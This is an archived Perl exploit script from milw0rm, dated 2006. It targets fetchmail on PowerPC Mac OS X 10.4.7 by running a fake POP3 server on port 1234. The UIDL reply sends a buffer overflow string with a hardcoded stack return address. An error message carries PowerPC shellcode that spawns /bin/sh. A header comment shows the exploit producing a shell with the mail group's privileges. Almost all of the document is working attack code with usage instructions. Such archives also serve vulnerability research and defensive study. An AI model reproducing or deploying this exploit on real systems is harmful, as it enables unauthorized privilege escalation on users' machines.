<html><head><title>Mac OS X <= 10.4.7 fetchmail Privilege Escalation Exploit (ppc)</title></head><pre>#!/usr/bin/perl
# getpwnedmail.pl
#
# http://www.digitalmunition.com
# written by kf (kf_lists[at]digitalmunition[dot]com) 
#
# This is a canibalized version of &quot;Kansas City POP Daemon Version 0.0&quot; - Copyright (c) 1999 David Nicol &lt;davidnicol@acm.org&gt;
#
# kevin-finisterres-mac-mini:~ kfinisterre$ /usr/bin/fetchmail -p pop3 --fastuidl 1 localhost -P 1234
# Enter password for kfinisterre@localhost: 
# sh-2.05b$ id
# uid=501(kfinisterre) gid=501(kfinisterre) egid=6(mail) groups=6(mail), 81(appserveradm), 79(appserverusr), 80(admin)
#
# http://docs.info.apple.com/article.html?artnum=106704

use Socket;
use IO::Handle;
use IO::Socket;

$banner = &quot;fetchmail ppc exploit - OSX 10.4.7 8J135&quot;;
$sc = &quot;iiii&quot; x 10 . 
# * PPC MacOS X shellcode
# * ghandi &lt;ghandi@mindless.com&gt;
  &quot;\x7c\xa5\x2a\x79&quot;  . # /* xor.   r5, r5, r5    ; r5 = NULL           */
  &quot;\x40\xa2\xff\xfd&quot;  . # /* bnel   shellcode                           */
  &quot;\x7f\xe8\x02\xa6&quot;  . # /* mflr   r31                                 */
  &quot;\x3b\xff\x01\x30&quot;  . # /* addi   r31, r31, 268+36                    */ 
  &quot;\x38\x7f\xfe\xf4&quot;  . # /* addi   r3, r31, -268 ; r3 = path           */
  &quot;\x90\x61\xff\xf8&quot;  . # /* stw    r3, -8(r1)    ; argv[0] = path      */
  &quot;\x90\xa1\xff\xfc&quot;  . # /* stw    r5, -4(r1)    ; argv[1] = NULL      */
  &quot;\x38\x81\xff\xf8&quot;  . # /* subi   r4, r1, 8     ; r4 = {path, 0}      */
  &quot;\x3b\xc0\x76\x01&quot;  . # /* li     r30, 30209                          */
  &quot;\x7f\xc0\x4e\x70&quot;  . # /* srawi  r0, r30, 9                          */
  &quot;\x44\xff\xff\x02&quot;  . # /* sc                   ; execve(r3, r4, r5)  */
  &quot;/bin/sh&quot;;

$eip = 0xbfffd238;  # No NX to worry about so just hop right on into the stack. 

$malstr = &quot;A&quot; x 196 . pack('l', $eip) x 2;
        
$PortNumber  = 1234;
$door = IO::Socket::INET-&gt;new( Proto=&gt;'tcp', LocalPort=&gt;$PortNumber, Listen=&gt;SOMAXCONN, Reuse=&gt;1 );
die &quot;Cannot set up socket: $!&quot; unless $door;

$timeout = 60;
$SIG{ALRM} = sub { die &quot;alarm or timeout\n&quot; };

print &quot;open a new window and type - \&quot;/usr/bin/fetchmail -p pop3 --fastuidl 1 localhost -P 1234\&quot;\n&quot;;
print &quot;choose any password and press enter\n&quot;; 
for(;;)
{
	until(  $client = $door-&gt;accept())
	{
		sleep 1;
        };
	$F = fork;
	die &quot;Fork weirdness: $!&quot; if $F &lt; 0;

        if($F)
	{
		close $client;
		next;
	};
                
        close ($door);

        $client-&gt;autoflush();
	&amp;AUTHORIZATION;
	&amp;TRANSACTION;
	exit;
};

sub OK($)
{
	my $A = shift;
        $A =~ s/\s+\Z//g;
        print $client &quot;+OK $A\r\n&quot;;
	alarm $timeout;
};

sub ERR($)
{
	my $A = shift;
        $A =~ s/\s+/ /g;
        $A =~ s/\s+\Z//g;
        print $client &quot;-ERR $A\r\n&quot;;
	alarm $timeout;
};

sub AUTHORIZATION
{
	$Name = '';
	OK &quot;$banner&quot;;
	NEEDUSER:
        $Data = &lt;$client&gt;;
        ($Name) =  $Data =~ m/^user (\w+)/i;
	unless($Name)
	{
		ERR &quot;The itsy bitsy spider walked up the water spout&quot;;
		die if ++$strikes &gt; 5;
		goto NEEDUSER;
	};
	OK &quot;User name ($Name) ok. Password, please.&quot;;
        $Data = &lt;$client&gt;;
        my($Pass) =  $Data =~ m/^pass (.*)/i;
	$Pass =~ s/\s+\Z//g;
	
	OK &quot;$Name has &quot; . 8 . &quot; messages&quot;;
};

sub TRANSACTION
{
	%deletia = ();
	START:
        $_ = $Data = &lt;$client&gt;;
	unless(defined($Data))
	{
		print &quot;Client closed connection\n&quot;;
		exit;
	};
	if (m/^STAT/i){ &amp;STAT; goto START};
	if (m/^UIDL/i){ &amp;UIDL; goto START};

	# Just cram the shellcode onto the stack... 
	ERR &quot;Welcome to Pwndertino !  $sc&quot;;

	goto START;
}

sub STAT
{
	alarm 0;	
	$mm = 0;
	$nn = scalar(@Messages);
	foreach $M (@Messages){
		$mm += -s &quot;$M&quot;;
	};
	OK &quot;8 7035&quot;;
};

sub List($)
{
	my $M = $Messages[$_[0]-1];
	return if $deletia{$M};
	print $client $_[0],' ',(-s $M).&quot;\r\n&quot;;
	alarm $timeout;
};

sub UIDL
{
	print &quot;Sending exploit string\n&quot;;
	OK &quot;1 &quot; . $malstr; 
};

# milw0rm.com [2006-08-01]</pre></html>